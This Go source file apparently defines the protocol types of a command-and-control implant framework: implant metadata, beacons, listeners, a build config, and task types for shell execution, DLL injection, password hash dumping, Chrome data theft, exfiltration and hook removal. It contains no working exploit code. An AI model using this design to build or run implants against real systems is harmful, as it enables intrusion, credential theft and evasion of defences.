package proto

import "time"

type ImplantMeta struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	Username  string    `json:"username"`
	Domain    string    `json:"domain"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	PID       uint32    `json:"pid"`
	Process   string    `json:"process"`
	Elevated  bool      `json:"elevated"`
	FirstSeen time.Time `json:"first_seen"`
	LastSeen  time.Time `json:"last_seen"`
	Sleep     uint32    `json:"sleep"`
	Jitter    uint8     `json:"jitter"`
}

type Task struct {
	ID        string    `json:"id"`
	ImplantID string    `json:"implant_id"`
	Type      TaskType  `json:"type"`
	Args      []string  `json:"args,omitempty"`
	Data      []byte    `json:"data,omitempty"`
	Created   time.Time `json:"created"`
}

type TaskResult struct {
	TaskID    string     `json:"task_id"`
	ImplantID string     `json:"implant_id"`
	Status    TaskStatus `json:"status"`
	Output    []byte     `json:"output,omitempty"`
	Error     string     `json:"error,omitempty"`
	Completed time.Time  `json:"completed"`
}

type TaskType string

const (
	TaskShell      TaskType = "shell"
	TaskPowershell TaskType = "powershell"
	TaskUpload     TaskType = "upload"
	TaskDownload   TaskType = "download"
	TaskCD         TaskType = "cd"
	TaskPWD        TaskType = "pwd"
	TaskLS         TaskType = "ls"
	TaskCat        TaskType = "cat"
	TaskMkdir      TaskType = "mkdir"
	TaskRm         TaskType = "rm"
	TaskPS         TaskType = "ps"
	TaskKill       TaskType = "kill"
	TaskWhoami     TaskType = "whoami"
	TaskEnv        TaskType = "env"
	TaskSleep      TaskType = "sleep"
	TaskExit       TaskType = "exit"

	TaskExecute   TaskType = "execute"
	TaskLoadDLL   TaskType = "load_dll"
	TaskLoadPE    TaskType = "load_pe"
	TaskInjectDLL TaskType = "inject_dll"
	TaskBOF       TaskType = "bof"

	TaskHashdump TaskType = "hashdump"
	TaskChrome   TaskType = "chrome"
	TaskExfil    TaskType = "exfil"

	TaskUnhook TaskType = "unhook"
)

type TaskStatus string

const (
	StatusPending  TaskStatus = "pending"
	StatusRunning  TaskStatus = "running"
	StatusComplete TaskStatus = "complete"
	StatusError    TaskStatus = "error"
)

type Beacon struct {
	ImplantID string        `json:"implant_id"`
	Results   []*TaskResult `json:"results,omitempty"`
}

type BeaconResponse struct {
	Tasks []*Task `json:"tasks,omitempty"`
}

type Listener struct {
	ID      string       `json:"id"`
	Name    string       `json:"name"`
	Type    ListenerType `json:"type"`
	Host    string       `json:"host"`
	Port    uint16       `json:"port"`
	Active  bool         `json:"active"`
	Created time.Time    `json:"created"`
}

type ListenerType string

const (
	ListenerHTTP  ListenerType = "http"
	ListenerHTTPS ListenerType = "https"
)

type BuildConfig struct {
	ListenerURL string `json:"listener_url"`
	Sleep       uint32 `json:"sleep"`
	Jitter      uint8  `json:"jitter"`

	Algorithm string `json:"algorithm"`
}
